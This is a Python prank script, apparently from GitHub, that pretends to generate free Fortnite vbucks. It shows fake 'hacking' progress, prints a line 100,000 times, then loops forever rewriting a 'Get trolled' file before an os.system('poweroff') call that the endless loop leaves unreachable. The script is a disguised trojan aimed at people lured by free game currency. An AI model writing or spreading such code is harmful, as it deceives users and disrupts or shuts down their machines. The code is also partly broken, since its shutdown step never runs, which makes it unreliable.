"""
# Free vbucks
# Edited by: Celvis
# Discord: Celvis#1772
# Original = https://github.com/stayfrostydoggo/Funny-Stuff-IG/blob/main/freevbucks.py
# Author = starfrostydoggo (Aka Bored)


ALMOST DONE. NOT DONE YET.
"""

# Import Modules
import itertools
import threading
import time
import sys
import os

# Set bux to 0
vbux = 0

# Wanted
wanted = int(input("How many vbucks do you want to receive: "))
vbux += wanted

# Fake load
# Load 1
done1 = False
def load1():
    for c in itertools.cycle(['.', '..', '...', '   ']):
        if done1:
            break
        sys.stdout.write("\rLoading vbux" + c)
        sys.stdout.flush()
        time.sleep(0.2)
t = threading.Thread(target=load1)
t.start()
time.sleep(3)
print("\n")
done1 = True

# Load 2
done2 = False
def load2():
    for c in itertools.cycle(['.', '..', '...', '   ']):
        if done2:
            break
        sys.stdout.write("\rBreaching Fortnite mainframe" + c)
        sys.stdout.flush()
        time.sleep(0.2)
t = threading.Thread(target=load2)
t.start()
time.sleep(5)
print("\n")
done2 = True

# Load 3
done3 = False
def load3():
    for c in itertools.cycle(['.', '..', '...', '   ']):
        if done3:
            break
        sys.stdout.write("\rBruteforcing vbux database" + c)
        sys.stdout.flush()
        time.sleep(0.2)
t = threading.Thread(target=load3)
t.start()
time.sleep(4)
print("\n")
done3 = True

# Load 4
done4 = False
def load4():
    for c in itertools.cycle(['.', '..', '...', '   ']):
        if done4:
            break
        sys.stdout.write("\rSiphoning vbux" + c)
        sys.stdout.flush()
        time.sleep(0.2)
t = threading.Thread(target=load4)
t.start()
time.sleep(3)
print("\n")
done4 = True

# Load5
done5 = False
def load5():
    for c in itertools.cycle(['.', '..', '...', '   ']):
        if done5:
            break
        sys.stdout.write("\rGenerating hash key for vbux" + c)
        sys.stdout.flush()
        time.sleep(0.2)
t = threading.Thread(target=load5)
t.start()
time.sleep(3)
print("\n")
done5 = True

print("\nVBUS HAK COMPLETE!!1111!!1!")
print(f"you have {vbux} vbucks")
x = 0
time.sleep(2)

while x < 100000:
        print("OMG I LOVE FREE VBUX")
        x += 1

# Creates a bunch of troll files
files = True
while files:
    f = open("vbux", "w")
    f.write("vbux vbux vbux vbux vbux vbux vbux vbux vbux vbux\nGet trolled :)\n\n\n\nCelvis#1772, stayfrostybro (Aka Bored)\nhttps://github.com/Celvis-wq/freevbucksTroll")
    f.close()

os.system("poweroff")
